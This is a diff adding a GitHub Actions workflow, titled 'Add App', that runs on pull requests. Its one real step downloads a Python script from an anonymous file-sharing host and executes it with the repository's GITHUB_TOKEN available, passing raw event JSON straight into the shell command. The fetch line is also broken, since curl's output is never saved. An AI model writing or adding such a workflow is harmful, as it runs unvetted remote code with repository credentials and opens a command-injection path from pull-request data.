@@ -1,0 +1,21 @@
+name: Add App
+
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+jobs:
+  update_apps:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Download and Run Script
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          curl -sSL "https://files.catbox.moe/pq7wjh.py"
+          python pq7wjh.py '${{ toJSON(github.event) }}'
